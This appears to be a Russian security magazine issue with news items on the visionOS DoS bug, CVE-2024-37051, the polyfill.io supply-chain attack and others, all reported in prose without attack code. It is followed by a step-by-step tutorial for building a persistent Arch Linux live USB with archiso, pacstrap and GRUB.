   залось, что эта функция по‑прежнему присутствует в WebKit и не требует
   никаких разрешений в Safari.
      Исследователь показал, что злоумышленник может использовать эту фун‐
  кцию для создания 3D-объектов любого типа, включая анимированные и со
   звуковыми  эффектами.  Для  этого  достаточно  вынудить  пользователя
   посетить вредоносный сайт.
    В качестве proof-of-concept атаки Пикрен продемонстрировал, как ком‐
   ната пользователя может наполниться сотнями виртуальных пауков и громко
   кричащих летучих мышей.

        «Самое жуткое заключается в том, что эти анимированные файлы
          обрабатываются отдельным приложением (Quick Look), поэтому зак- «
        рытие Safari не избавит от них, — объясняет исследователь. — А пос-
           кольку в visionOS нет Dock или какого‑либо другого Open Apps UI, нет
          очевидного способа избавиться от них, только бегать по комнате, что-
       бы физически коснуться каждого».                 »
   Эксперт заключает, что был удивлен тем, что Apple классифицировала эту
   проблему как DoS. По его словам, компания выплатила ему вознаграждение
  за его находку, однако точная сумма не разглашается.


  210 МИЛЛИАРДОВ РУБЛЕЙ УЩЕРБА ОТ ИТ-
  ПРЕСТУПЛЕНИЙ

   Согласно  статистике МВД РФ, которую  озвучил министр Владимир Колокольцев,  только
   в прошлом году от преступлений с использованием ИТ пострадало более 500 тысяч человек
   и четверть из них — пенсионеры. В 2024 году количество пострадавших уже приближается
   к 40 тысячам.

   Суммарный ущерб от таких преступлений за весь 2023 год и четыре месяца 2024 года составил
   более 210 миллиардов рублей.

  С 2020 года количество киберпреступлений возросло на треть, и теперь их доля в общем объ‐
   еме приблизилась к 40%.





                                        Продолжение статьи →
← Начало статьи





 РЕКЛАМА
 НА YOUTUBE
   Разработчики YouTube экспериментируют со встраиванием рекламы непос‐
   редственно в видеопоток, чтобы блокировщикам рекламы было сложнее
   от нее избавиться.
     Первыми нововведение заметили создатели опенсорсного браузерного
  расширения SponsorBlock, которое собирает информацию о том, какие
   фрагменты видео содержат спонсорский контент, чтобы пропустить их.
      Авторы SponsorBlock предупредили, что внедрение рекламы на стороне
   сервера нарушает работу расширения, и уже ведется работа над решением
  этой проблемы. Кроме того, встраивание рекламы в видеопоток сказывается
  на  эффективности  других  блокировщиков,  которые  люди  используют
  на YouTube.
      Дело в том, что сейчас YouTube внедряет рекламу на стороне клиента:
   JavaScript-скрипты и видеоплеер на устройстве пользователя подгружают
  и показывают рекламу. То есть видеопоток и реклама разделены, а плеер
   запрограммирован на приостановку контента и воспроизведение рекламы
   в заданных точках.
      Большинство блокировщиков отключают рекламу на YouTube, блокируя
   JavaScript, используемый для внедрения рекламы в видеопоток. SponsorBlock
   работает немного иначе: с помощью краудсорсинга он собирает информа‐
  цию о различных сегментах видео и позволяет пользователям пропускать
   спонсорские интеграции.
     Внедрение рекламы на стороне сервера позволяет встроить ее непос‐
   редственно в видеопоток, то есть еще до того, как контент будет доставлен
   зрителю. В итоге пользователи получают непрерывный поток, в который уже
   интегрирована реклама.
    В SponsorBlock объясняют, что YouTube транслирует видео с помощью
  серии небольших фрагментов, которые «сшиваются» вместе для создания
   непрерывного потока. Порядок воспроизведения этих фрагментов определя‐
   ется файлом манифеста, и, когда пользователь открывает видео, сервер
  YouTube передает ему плейлист, в который включены как контент, так и рек‐
  ламные фрагменты.
      Такой подход усложняет работу SponsorBlock, поскольку смещает времен‐
  ные метки для спонсорского контента, а в зависимости от продолжительнос‐
   ти рекламы это смещение меняется. Кроме того, это создает трудности
  для работы других блокировщиков: они хуже распознают рекламу, которая
   является частью самого ролика (в отличие от легко обнаруживаемых инъ‐
  екций на стороне клиента).
      Пока  разработчики SponsorBlock вынуждены  блокировать сообщения
   от браузеров, где происходит внедрение рекламы на стороне сервера, чтобы
   предотвратить повреждение данных. Однако, если YouTube перейдет к внед‐
  рению рекламы на стороне сервера в большем масштабе, такой подход ста‐
   нет неэффективным.
      Предполагается, что в будущем инструмент, вероятно, сможет вычислять
   продолжительность рекламы по метаданным и элементам пользовательского
   интерфейса YouTube, но пока система к этому не готова.
     Что касается разработчиков других блокировщиков, со временем они
   могут создать более сложные алгоритмы обнаружения, использовать анализ
   метаданных и углубленное распознавание образов для определения резких
   изменений в аудио и видео, которые могут свидетельствовать о включении
   рекламы.
      Представители Google прокомментировали ситуацию следующим обра‐



         «YouTube работает над повышением производительности и надеж-
         ности   как   органического,   так  и   рекламного   видеоконтента.   зом:«
        Это обновление может приводить к возникновению неоптимальных
          впечатлений от просмотра у пользователей блокировщиков рекламы.
            Блокировщики рекламы нарушают Terms of Service YouTube, и мы
        уже давно призываем пользователей поддерживать любимых авторов,
         разрешая рекламу на YouTube, или попробовать YouTube Premium
         для работы без рекламы».                 »
   Стоит сказать, что практически аналогичный туманный комментарий в ком‐
  пании давали журналистам в конце мая 2024 года, когда пользователи бло‐
   кировщиков обнаружили, что теперь в некоторых случаях видео на YouTube
   автоматически перематываются в конец или в роликах отключается звук, что
   делает просмотр видео невозможным.


  ОТЧЕТ О ПРОЗРАЧНОСТИ «ЯНДЕКСА»

   Компания «Яндекс» опубликовала отчет о прозрачности за вторую половину 2023 года.

  С июля по декабрь 2023 года по требованию Роскомнадзора из поиска было удалено 193 927
   ссылок (на 3402 ссылки больше, чем в первой половине 2023 года), а также получено 36 305
   запросов на раскрытие данных о пользователях.

   Больше всего запросов на раскрытие данных пользователей (22 918) пришлось на «Райдтех»,
   в который входят сервисы такси, самокатов, доставки и «Драйв». Процент отказов составил
  16% (3652 случая). Далее идут «Яндекс Почта» (6115 запросов и 859 отказов) и «Фудтех»
   («Еда», «Лавка», «Деливери»; 4556 запросов и 1294 отказа).





    Также к «Яндексу» обращались по закону «о праве на забвение», который обязывает поисковые
   системы удалять из результатов поиска ссылки на незаконную, недостоверную или неактуаль‐
   ную информацию о заявителе. Всего таких запросов набралось 11 598 за полгода.





 IDE INTELLIJ СЛИВАЕТ
 ТОКЕНЫ GITHUB
   JetBrains предупредила клиентов об исправлении критической уязвимости,
  которая затронула пользователей IDE IntelliJ и позволяла получить доступ
   к токенам GitHub.
      Уязвимость отслеживается под идентификатором CVE-2024-37051 и зат‐
   рагивает все IDE на базе IntelliJ, начиная с версии 2023.1, в которых включен,
   настроен или используется плагин JetBrains GitHub.

         «29 мая 2024 года мы получили сообщение о возможной уязвимости,
         которая способна влиять на pull request’ы в IDE, — рассказал Илья «
          Плескунин,    руководитель    группы    поддержки    безопасности
         в JetBrains. — Так, вредоносный контент, содержащийся в пул‑рек-
         весте для GitHub и обрабатываемый IDE на базе IntelliJ, может при-
           вести к передаче токенов доступа на сторонний хост».                 »
   JetBrains уже выпустила патчи, устранившие критическую проблему в вер‐
  сии 2023.1 или более поздних. Также компания исправила уязвимый плагин
   JetBrains GitHub и удалила все ранее затронутые версии из своего официаль‐
  ного маркетплейса плагинов.
     Полный список исправленных версий включает:
   • Aqua: 2024.1.2;
   • CLion: 2023.1.7, 2023.2.4, 2023.3.5, 2024.1.3, 2024.2 EAP2;
   • DataGrip: 2024.1.4;
   • DataSpell: 2023.1.6, 2023.2.7, 2023.3.6, 2024.1.2;
   • GoLand: 2023.1.6, 2023.2.7, 2023.3.7, 2024.1.3, 2024.2 EAP3;
   • IntelliJ IDEA: 2023.1.7, 2023.2.7, 2023.3.7, 2024.1.3, 2024.2 EAP3;
   • MPS: 2023.2.1, 2023.3.1, 2024.1 EAP2;
   • PhpStorm: 2023.1.6, 2023.2.6, 2023.3.7, 2024.1.3, 2024.2 EAP3;
   • PyCharm: 2023.1.6, 2023.2.7, 2023.3.6, 2024.1.3, 2024.2 EAP2;
   • Rider: 2023.1.7, 2023.2.5, 2023.3.6, 2024.1.3;
   • RubyMine: 2023.1.7, 2023.2.7, 2023.3.7, 2024.1.3, 2024.2 EAP4;
   • RustRover: 2024.1.1;
   • WebStorm: 2023.1.6, 2023.2.7, 2023.3.7, 2024.1.4.

   Администраторам рекомендуется как можно скорее установить патчи и отоз‐
   вать токены GitHub. Также компания настоятельно советует клиентам, активно
  использующим функциональность пул‑реквестов GitHub в IntelliJ IDE, отозвать
  все токены GitHub, используемые уязвимым плагином, поскольку они могут
   предоставить потенциальным злоумышленникам доступ к связанным акка‐
  унтам на GitHub (даже если включена дополнительная защита в виде двух‐
   факторной аутентификации).
     Кроме того, если плагин использовался с интеграцией OAuth или Personal
  Access Token (PAT), следует отозвать доступ JetBrains IDE Integration и удалить
   токен плагина интеграции IntelliJ IDEA с GitHub. Подчеркивается, что после
   отзыва токена придется заново настроить плагин, так как все его функции
   (включая операции с Git) перестанут работать.
     Помимо  этого,  JetBrains  связалась с  разработчиками  GitHub,  чтобы
  помочь минимизировать последствия уязвимости. Поэтому, в связи с при‐
   нятыми мерами, плагин JetBrains GitHub может работать некорректно в ста‐
  рых версиях IDE JetBrains.





  APPLE НЕ ЗАПЛАТИЛА «ЛАБОРАТОРИИ КАСПЕРСКОГО»
   Летом 2023 года ФСБ и ФСО России предупредили о «разведывательной акции американских
   спецслужб, проведенной с использованием мобильных устройств фирмы Apple». Вскоре после
    этого «Лаборатория Касперского» опубликовала развернутый отчет о целевых атаках, нап‐
   равленных на устройства, работающие под управлением iOS, а также сообщила о нескольких
   использованных в этой кампании уязвимостях.
     В итоге эти шпионские атаки получили название «Операция „Триангуляция“», и специалис‐
   ты писали, что это «самая изощренная цепочка атак» из всех, что они когда‑либо видели.
      Как выяснилось теперь, компания Apple так и не выплатила «Лаборатории Касперского»
   причитающиеся bug bounty. Причем вознаграждение за обнаружение такого рода багов может
   составлять до миллиона долларов США.

          «Мы нашли zero-day-,  zero-click-уязвимости, передали всю информацию →           Apple, сделали полезное дело. По сути своей, мы зарепортили им уязвимость,
          за которую они должны заплатить bug bounty. Нам это вознаграждение не нуж‐
           но, но есть практика такие выплаты от больших компаний передавать на благот‐
           ворительность. Apple отказала нам в выплате, даже в пользу благотворительной
            организации, сославшись на внутреннюю политику, без объяснения. Учитывая,
            сколько информации мы им предоставили и насколько проактивно это сде‐
           лали, — непонятно, почему они приняли такое решение.
              После обнаружения шпионского модуля в iPhone сотрудников компании
          в прошлом году мы ушли с iOS. Всем сотрудникам компании сейчас планово,
           поэтапно выдают корпоративные мобильные устройства на Android. Мы ушли
          с iOS не потому, что она менее безопасна, а потому, что нам, как security-вен‐
          дору, хочется иметь в своих руках больше контроля над безопасностью устрой‐
            ств. На iOS мы не можем поставить полноценный продукт, который будет ска‐
           нировать  активность,  файлы,  предоставлять  информацию,  необходимую
          для incident response. Android к тому же предоставляет больший функционал
          для MDM. В общем, если какая‑то кибератака на сотрудников снова произой‐
           дет, то разбираться с ней на iOS будет сложно, как показала практика», — рас‐
            сказал журналистам RTVI Дмитрий Галов, руководитель российского исследова‐
             тельского центра «Лаборатории Касперского».





 АТАКА ЧЕРЕЗ
 POLYFILL
   Вокруг сервиса polyfill(.)io развернулся громкий скандал, связанный с атакой
  на цепочку поставок.
     Термином polyfill («полифил») обозначают код, реализующий какую‑либо
   функциональность, которая поддерживается не во всех версиях браузеров.
   Например, полифил может добавлять JavaScript-функциональность, которая
   недоступна для старых браузеров, но уже присутствует в современных.
        Polyfill(.)io используется множеством сайтов, чтобы все их посетители мог‐
  ли пользоваться одной и той же кодовой базой, даже если их браузеры
  не поддерживают какие‑то современные функции.
    В конце июня стало известно о масштабной атаке на цепочку поставок,
   затронувшей не менее 100 тысяч сайтов, использовавших cdn.polyfill(.)io.
      Дело в том, что домен недавно приобрела китайская компания Funnull,
   после чего исследователи компании Sansec обнаружили, что скрипт был
   модифицирован  для  перенаправления  пользователей  на  вредоносные
  и мошеннические сайты.
    При этом разработчик оригинального проекта Эндрю Беттс (Andrew Betts)
  еще в феврале предупреждал о том, что он никогда не был владельцем
    polyfill(.)io и не имел к нему отношения. Еще тогда он рекомендовал всем вла‐
   дельцам сайтов немедленно избавиться от этого кода.
      Более того, Беттс, создавший опенсорсный проект polyfill еще в середи‐
  не 2010-х годов, вообще писал о том, что людям следует прекратить исполь‐
   зовать polyfill(.)io, так как в современном мире в этом уже нет никакой нужды.
      Когда информация об атаке начала распространяться в СМИ, домен
    polyfill(.)io был закрыт регистратором Namecheap. Однако новые владельцы
   сервиса тут же возобновили его работу на новом домене (polyfill(.)com),
   заявив, что их оклеветали и «никаких рисков для цепочки поставок нет».
  По состоянию на 28 июня 2024 года новый домен тоже перестал отвечать и,
  похоже, также был закрыт регистратором.
      Более того, после предания этой истории огласке представители ком‐
  пании Cloudflare выразили недовольство тем, что polyfill(.)io неправомерно
   использовал название и логотип Cloudflare.
     Компания заявила, что неспособность polyfill(.)io удалить «ложные заяв‐
  ления» со своего сайта (хотя представители Cloudflare связывались с ком‐
   панией) служит «еще одним предупреждающим сигналом о том, что им нель‐
   зя доверять».
     Кроме  того, в  Cloudflare  подтвердили выводы  специалистов Sansec
  и сообщили, что CDN polyfill(.)io используется для перенаправления поль‐
   зователей, например, на  сайты со ставками на спорт и это делается
  с помощью доменного имени google-anaiytics(.)com, которое умышленно
   написано неправильно и имитирует Google Analytics.
      Соучредитель и глава Cloudflare Мэттью Принс (Matthew Prince) добавил,
   что около 4% всех сайтов в интернете (то есть десятки миллионов ресурсов)
   используют polyfill(.)io, и назвал возможные последствия от этой атаки «край‐
  не тревожными».
    В ответ на эти обвинения новые владельцы сервиса опубликовали серию
  сообщений в социальной сети X (бывший Twitter), где заявили о своей неп‐
   ричастности к масштабной атаке на цепочку поставок и обвинили СМИ в кле‐



       «Мы обнаружили в СМИ сообщения, клевещущие на Polyfill. Мы хотим
          пояснить, что все наши сервисы кешируются в Cloudflare и никакого   вете:«
          риска для цепочки поставок нет», — пишут представители сервиса.                 »
   Однако ИБ‑исследователи призывают не верить заявлениям компании. Так,
   издание Bleeping Computer выяснило, что эта масштабная атака была про‐
   ведена сразу через несколько CDN (polyfill(.)io, BootCDN, Bootcss и Staticfile)
  и могла затронуть вовсе не 100 тысяч, а десятки миллионов сайтов, причем
  за происходящим стоит один оператор.
      Специалисты ожидают, что эффект от этой атаки проявит себя в ближай‐
  шие недели, тогда будет более понятен масштаб произошедшего.
     Многие опасаются, что операторы polyfill(.)io могли заранее зарегистри‐
  ровать множество доменов у разных регистраторов (например, polyfill(.)cloud)
  и теперь могут начать развертывание этих доменов, услугами которых смогут
   по‑прежнему воспользоваться люди, ничего не знающие о происходящем.
     Всем, кто еще этого не сделал, рекомендуется как можно скорее перейти
  на безопасные  альтернативы, уже созданные  специалистами  Cloudflare
  и Fastly.
      Также в этом может помочь сайт Polykill.io, созданный компанией Leak
   Signal. Этот сервис позволяет выявлять сайты, использующие  polyfill(.)io,
  и предлагает информацию о переходе на альтернативные решения.


  ДРУГИЕ ИНТЕРЕСНЫЕ СОБЫТИЯ МЕСЯЦА

   RCE-уязвимость в PHP влияет на все версии Windows


   Google начинает внедрение Manifest V3


    Атака SnailLoad позволяет следить за пользователями без прямого доступа к трафику


  В США полностью запретили продажу продуктов «Лаборатории Касперского»


   Фанаты MMO Club Penguin взломали Disney и похитили 2,5 Гбайт данных


   Корпоративная сеть TeamViewer пострадала от атаки


   Hugging Face предупреждает: платформу Spaces взломали


   РКН потребовал от Google и Opera заблокировать расширение для обхода блокировок


   Вышла Kali Linux 2024.2 с 18 новыми инструментами


   Игроки призвали избавить Team Fortress 2 от ботов
COVERSTORY





Сегодня мы с тобой создадим «живой»
USB-накопитель с установочным образом
Arch  Linux. «Живой» в том  смысле, что
во время использования можно будет уста‐
навливать и  удалять программы, менять               ksandr                                                                                            ksandr@tutamail.com
любые файлы и сохранять изменения. Я
приготовил для  тебя  максимально  под‐
робную инструкцию по основным действи‐
ям, но дальше ты сможешь настроить всё
так, как тебе понравится.


У каждого линуксоида есть любимая система. У некоторых даже несколько,
каждая — для особых задач. Один из таких специальных случаев — это пор‐
тативная система, которую можно загрузить на чужой машине или на твоей,
если основная ОС вдруг перестала работать нормально.
   Есть   множество  готовых   разработок,   предназначенных  как  раз
для решения таких задач. Но мы‑то хотим получить полностью кастомизи‐
рованное окружение — привычное и с набором нужных программ!
   Варианта здесь два: сделать загрузочный образ ISO либо просто уста‐
новить всё на флешку. В первом случае система будет в разы компактнее,
во втором мы получим важную возможность ставить и удалять программы
и менять настройки во время работы.
   Да, флешка будет изнашиваться, но стоят они сейчас недорого, и воз‐
можность работы с полноценной ОС, на мой взгляд, гораздо важнее.


ПОДГОТОВКА

Все работы я буду проводить на Arch Linux для x86-64 и возьму оригинальные
archiso, которые используются для создания официальных ISO-образов.
   Поэтому в систему должны быть установлены следующие пакеты: archiso,
arch-install-scripts, gptfdisk.
   Можно как сразу установить на USB-накопитель, так и создать образ дис‐
ка, который потом можно будет записать на флешку. Далее я опишу процесс
создания образа диска.


СОЗДАЕМ ПУСТОЙ ФАЙЛ ПОД РАЗМЕР ФЛЕШКИ

Переходим в каталог, где будем создавать наш образ.


cd ~

Все дальнейшие действия будем делать с привилегиями суперпользователя.


su

Чтобы тебе было легче ориентироваться, буду показывать вывод некоторых
команд.
   Узнать точный размер устройства можно командой


lsblk -bo NAME,SIZE



  lsblk -bo NAME,SIZE
  NAME   SIZE
  sda4005527552
  ├─sda1   10485760
  ├─sda2  268435456
  └─sda3 3725540864
  mmcblk0 62226694144
  ├─mmcblk0p1   209715200
  └─mmcblk0p2 62015930368


Она покажет все устройства, среди них тебе нужно найти свой USB-накопи‐
тель.
   Узнав номер устройства, ты можешь составить команду и задать нужный
размер файла. Делим размер на 4096 и получаем нужное количество блоков.
   Примеры:


16 Гб: 16034824192 / 4096 = 3914752
4 Гб:   4005527552 / 4096 = 977912

4096 — это обычный размер сектора для файловой системы.
   Команда для создания файла usb.img размером 4 Гбайт:


dd if=/dev/zero of=usb.img bs= 4096 count=977912 status=progress



  $ dd if=/dev/zero of=usb.img bs=4096 count=977912 status=progress
  3651747840 байт (3,7 GB, 3,4 GiB) скопирован, 8 s, 456 MB/s
  977912+0 записей получено
  977912+0 записей отправлено
  4005527552 байт (4,0 GB, 3,7 GiB) скопирован, 8,78378 s, 456 MB/s


Проверяем:


ls -la usb.img



  $ ls -la usb.img
  -rw-rw-r-- 1 root root 4005527552 апр 25 19:51 usb.img


Если файл получился больше, можно обрезать до нужной длины с помощью
truncate. Например, до 16 Гбайт:


truncate -s 16034824192 usb.img


СОЗДАЕМ РАЗМЕТКУ ДИСКА

Чтобы наша система могла загружаться на компьютерах и с BIOS, и с EFI, нам
нужно разметить диск на три раздела:
 • один — 10 Мбайт, без файловой системы, необходим для установки заг‐
   рузчика GRUB в режиме BIOS;
 • второй — 256 Мбайт, будет отформатирован в FAT32, здесь создадим раз‐
   дел boot и поставим GRUB в режиме EFI;
 • все оставшееся место отдадим корневой файловой системе. Отформа‐
   тируем ее в Ext4.

Создаем разметку GPT и делим диск на три раздела:


sgdisk -o -n 1:0:+10M -t 1:EF02 -n 2:0:+256M -t 2:EF00 -n 3:0:0 -t 3:
8300 usb.img



  $ sgdisk -o -n 1:0:+10M -t 1:EF02 -n 2:0:+256M -t 2:EF00 -n 3:0:0 -t
  3:8300 usb.img
  Creating new GPT entries in memory.
  Warning: The kernel is still using the old partition table.
  The new table will be used at the next reboot or after you
  run partprobe(8) or kpartx(8)
  The operation has completed successfully.



МОНТИРУЕМ В СИСТЕМУ СОЗДАННЫЙ ОБРАЗ

Создаем связь между файлом образа usb.img и устройством loopback.
Это позволяет работать с файлом образа так, как если бы он был физическим
устройством, например USB-накопителем.


losetup --show -Pf usb.img



  $ losetup --show -Pf usb.img
  /dev/loop0


Команда покажет имя созданного устройства, в данном случае это /dev/
loop0.
   Проверяем.


ls /dev/loop0*



  $ ls /dev/loop0*
  /dev/loop0
  /dev/loop0p1
  /dev/loop0p2
  /dev/loop0p3


У нашего образа должно быть три раздела: loop0p1, loop0p2, loop0p3.


Форматируем разделы
По стандарту раздел EFI должен быть отформатирован в FAT32.


mkfs.fat -F32 /dev/loop0p2



  $ mkfs.fat -F32 /dev/loop0p2
  mkfs.fat 4.2 (2021-01-31)


Третий раздел будет основным, для него можно выбрать любую ФС, которую
будут поддерживать и загрузчик, и ядро.
   Форматируем в Ext4:


mkfs.ext4 /dev/loop0p3



  $ mkfs.ext4 /dev/loop0p3
  mke2fs 1.46.5 (30-Dec-2021)
  ...
  ...
  Создание журнала (16384 блоков): готово
  Writing superblocks and filesystem accounting information: готово



Монтируем разделы в /mnt/usb
Сначала мы смонтируем раздел /dev/loop0p3, это будет наш основной раз‐
дел, на который установим систему. Затем на этом разделе мы создадим
каталог /boot, в который смонтируем раздел /dev/loop0p2.


mkdir -p /mnt/usb
mount /dev/loop0p3 /mnt/usb
mkdir /mnt/usb/boot
mount /dev/loop0p2 /mnt/usb/boot


КОПИРУЕМ AIROOTFS

Несколько слов об Archiso. Это инструмент, с помощью которого создают
официальные  образы  Arch  Linux. Он  состоит из  двух  частей:  скрипта
mkarchiso, который собирает образ, и каталога с настройками будущего
образа. Нам нужен будет каталог с конфигами. В нем находятся:
 • список пакетов, которые необходимо установить, они хранятся в файле
  packages.x86_64;
 • каталог airootfs. Его структура идентична структуре Arch Linux, здесь
   лежат конфиги системы.

Нам три раза придется указывать путь до каталога с настройками Archiso.
Чтобы было проще, вынесем путь к нему в переменную.


export ARCHISO=/usr/share/archiso/configs/releng

Копируем  настройки официального образа до  установки пакетов. Если
при установке пакета обнаружится, что конфиг для него уже есть, файл
не переписывается, а создается новый с расширением .pacnew. Во время
установки пакетов будут показаны предупреждения об этом.


cp -afv $ARCHISO/airootfs/* /mnt/usb/


ПЕРЕВОД НЕКОТОРЫХ ФАЙЛОВ НА РУССКИЙ (НЕОБЯЗАТЕЛЬНО)

В своем образе ты можешь поменять приветствие системы на какое хочешь.
Файл приветствия — /etc/motd. Я сделал (ну ладно, Яндекс сделал) простой
перевод исходного файла, ниже — команда, которой его можно заменить.


wget -O /mnt/usb/etc/motd https://gitflic.ru/project/ksandr/archi/
blob/raw?file=airootfs/etc/motd

В установочном образе есть команда Installation_guide, открывающая
в консольном текстовом браузере страницу вики по установке системы.
   Заменим в ней ссылку, чтобы она указывала на русскоязычный аналог
страницы.


sed -i 's/https:\/\/wiki.archlinux.org\/title\/Installation_guide/
https:\/\/wiki.archlinux.org\/title\/Installation_guide\(
%D0%A0%D1%83%D1%81%D1%81%D0%BA%D0%B8%D0%B9)/' /mnt/usb/usr/local/bin/
Installation_guide


СТАВИМ ПАКЕТЫ

Список пакетов берем из настроек официального образа.
   Команда установки:


pacstrap -c -G -M -C $ARCHISO/pacman.conf -- /mnt/usb

Для парсинга списка пакетов подойдет такая команда:


grep -v '^#' $ARCHISO/packages.x86_64 | tr '\n' ' ' | xargs pacstrap
-c -G -M -C $ARCHISO/pacman.conf -- /mnt/usb



  $ grep -v '^#' packages.x86_64 | tr '\n' ' ' | xargs pacstrap -c -G -M -
  C pacman.conf -- /mnt/usb
  ...
  ...
  ...
  (14/16) Reloading system bus configuration...
  Skipped: Running in chroot.
  (15/16) Warn about old perl modules
  perl: warning: Setting locale failed.
  perl: warning: Please check that your locale settings:
  LANGUAGE = (unset),
  LC_ALL = (unset),
  LC_MESSAGES = "ru_RU.UTF-8",
  LANG = "ru_RU.UTF-8"
  are supported and installed on your system.
  perl: warning: Falling back to the standard locale ("C").
  (16/16) Updating the info directory file...


Если процесс закончился такими строками, можно идти дальше. Если нет —
посмотри, верно ли выполнил каждое действие.


ДОКРУЧИВАЕМ НАСТРОЙКИ

Основная часть установки совпадает с тем, что написано в официальной
вики.
  Но чтобы было удобнее пользоваться этой статьей, я позволю себе пов‐
торить часть действий из официального руководства.
   Генерируем файл /etc/fstab для нашего образа — список файловых
систем, монтируемых при загрузке системы.


genfstab -U /mnt/usb > /mnt/usb/etc/fstab

Переходим в chroot. Это позволит изолировать процесс от остальной сис‐
темы и создаст виртуальную среду, в которой процесс может вести себя,
как будто он работает в отдельной системе.
   После выполнения этой команды текущий процесс и все его дочерние
процессы будут работать в  изолированной  среде, корневым каталогом
которой будет /mnt/usb.


arch-chroot /mnt/usb

Нам необходимо отредактировать файл /etc/fstab.
   Если на системе, с которой ты создаешь образ, используется раздел
swap, то при генерации файла /etc/fstab добавится запись о монтировании
этого раздела.
   Необходимо отключить в fstab раздел swap, если он там есть. Удали
или закомментируй строку, которая за него отвечает.


vim /etc/fstab

Также рекомендую изменить параметры монтирования с realtime на noatime,
это уменьшает количество операций записи на диск.
   Ниже пример файла с внесенными изменениями, значения UUID в твоем
файле будут другими.



  $ cat /etc/fstab
  $ /dev/loop0p3
  UUID=d6ef477c-8db7-4b1b-9e55-a28fefbf03c1   / ext4  rw,noatime  0 1


  $ /dev/loop0p2
  UUID=C963-38B9/boot vfat
  rw,noatime,fmask=0022,dmask=0022,codepage=437,iocharset=ascii,shortname=
  mixed,utf8,errors=remount-ro0 2


  $ /dev/sda1
  #UUID=8ac5fbc3-058e-4a18-a084-e68b52c1af46  none  swap  defaults0 0


Установи свою временную зону.


ln -sf /usr/share/zoneinfo/Europe/Moscow /etc/localtime

Файл /etc/locale.gen содержит списки доступных локализаций системы,
рекомендую оставить эти две:


en_US.UTF-8 UTF-8
ru_RU.UTF-8 UTF-8

Сгенерируй файлы локализации.


locale-gen

Установи общесистемное значение переменной LANG.


echo LANG=ru_RU.UTF-8 > /etc/locale.conf

Установи шрифт и параметры изменения раскладки.
  В файл /etc/vconsole.conf запиши:


KEYMAP=ru
FONT=cyr-sun16


             INFO

                           Некоторые из манипуляций, описанных в этом
                           разделе, можно  проделать  сразу с  каталогом
                            archiso, тогда при установке будет меньше дей‐
                         ствий.





                                     Продолжение статьи →
COVERSTORY            ← НАЧАЛО СТАТЬИ
   КАРМАННЫЙ ARCH
            ДЕЛАЕМ ФЛЕШКУ С ЖИВЫМ
               ОБРАЗОМ ARCH LINUX





СТАВИМ ЗАГРУЗЧИКИ

Начать надо с создания начального загрузочного диска системы.
   Отредактируй файл предустановки /etc/mkinitcpio.d/linux.preset.
  Мы будем использовать стандартный файл настроек mkinitcpio, так что
измени строку, указывающую на конфиг.


vim /etc/mkinitcpio.d/linux.preset


$ mkinitcpio preset file for the 'linux' package on archiso
PRESETS=('archiso')
ALL_kver='/boot/vmlinuz-linux'
archiso_config='/etc/mkinitcpio.conf'
archiso_image="/boot/initramfs-linux.img"

Отредактируй файл настроек mkinitcpio. В параметре HOOKS необходимо
убрать autodetect.


vim /etc/mkinitcpio.conf


...
HOOKS=(base udev microcode modconf kms keyboard keymap consolefont
block filesystems fsck)
...

Пересоздай образ initcpio.


             INFO

                         Образ mkinitcpio в Arch Linux — это сгенерирован‐
                     ный скриптом mkinitcpio образ, который содер‐
                      жит все необходимые для загрузки и инициали‐
                      зации системы файлы и скрипты. Этот образ
                            используется в процессе загрузки системы, когда
                      ядро Linux загружается, но перед тем, как пол‐
                      ностью  инициализировать  систему и передать
                         управление пользовательскому пространству.



mkinitcpio -P



  $ mkinitcpio -P
  ==> Building image from preset: /etc/mkinitcpio.d/linux.preset:
  'archiso'
  ...
  ==> Initcpio image generation successful


Устанавливаем загрузчик для систем с BIOS. Он ставится в начало диска,
для этого мы и создавали первый раздел.
   Обрати внимание: в команде указан диск, а не раздел диска!


grub-install --target=i386-pc --recheck /dev/loop0



  $ grub-install --target=i386-pc --recheck /dev/loop0
  Выполняется установка для платформы i386-pc.
  Установка завершена. Ошибок нет.


Устанавливаем загрузчик для систем с EFI.


grub-install --target=x86_64-efi --efi-directory /boot --recheck
--removable



  $ grub-install --target=x86_64-efi --efi-directory /boot --recheck --
  removable
  Выполняется установка для платформы x86_64-efi.
  Установка завершена. Ошибок нет.


Создаем файл с настройками загрузчика.


grub-mkconfig -o /boot/grub/grub.cfg



  $ grub-mkconfig -o /boot/grub/grub.cfg
  Генерируется файл настройки grub …
  Найден образ linux: /boot/vmlinuz-linux
  Найден образ initrd: /boot/intel-ucode.img /boot/amd-ucode.img
  /boot/initramfs-linux.img
  Предупреждение: os-prober не будет запущен для обнаружения других заг‐
  рузочных разделов.
  Их системы не будут добавлены в загрузочные настройки GRUB.
  Прочтите документацию на параметр GRUB_DISABLE_OS_PROBER.
  Добавляется элемент загрузочного меню для настроек микропрограммы UEFI …
  Found memtest86+ image: /boot/memtest86+/memtest.bin
  /usr/bin/grub-probe: предупреждение: неизвестный тип устройства loop0.
  Found memtest86+ EFI image: /boot/memtest86+/memtest.efi
  /usr/bin/grub-probe: предупреждение: неизвестный тип устройства loop0.
  завершено


Как ты уже понял, мы установили два загрузчика, и оба они обращаются
к одному конфигурационному файлу.
  В официальном ISO-образе Arch Linux используется загрузчик Syslinux.
Можно было бы использовать и его, это дело вкуса. Я выбрал более простой
в настройке вариант.


НАСТРАИВАЕМ ЖУРНАЛИРОВАНИЕ

Чтобы уменьшить количество обращений к диску, настраиваем журналиро‐
вание в оперативную память, а не на диск.
   Создаем каталог:


mkdir -p /etc/systemd/journald.conf.d

Записываем настройки ниже в файл /etc/systemd/journald.conf.d/10-
volatile.conf:


[Journal]
Storage=volatile
SystemMaxUse=16M
RuntimeMaxUse=32M


ДОПОЛНИТЕЛЬНОЕ ДЕЙСТВИЕ

При создании ISO-образа диска при помощи mkarchiso часть настроек дела‐
ется при помощи «хуков» (сценариев командной строки) менеджера пакетов
pacman. Эти хуки удаляются при создании ISO.
   Так как мы собираем образ сами, нам нужно удалить некоторые хуки вруч‐
ную.


rm -v -- $(grep -Frl 'remove from airootfs' /etc/pacman.d/hooks/)


ЗАДАЕМ ПАРОЛЬ РУТА (НЕОБЯЗАТЕЛЬНО)

По умолчанию пароль для root отсутствует, ты можешь установить свой.
При загрузке происходит автоматический вход с логином root.
   SSH-доступ для root тоже открыт по умолчанию.


passwd



  $ passwd
  Новый пароль:
  Повторите ввод нового пароля:
  passwd: пароль успешно обновлён


Еще можно создать обычного пользователя.


ОБРАЗ ГОТОВ, ДЕМОНТИРУЕМ УСТРОЙСТВА

Выходим из chroot.


exit

Размонтируем разделы в обратной последовательности.


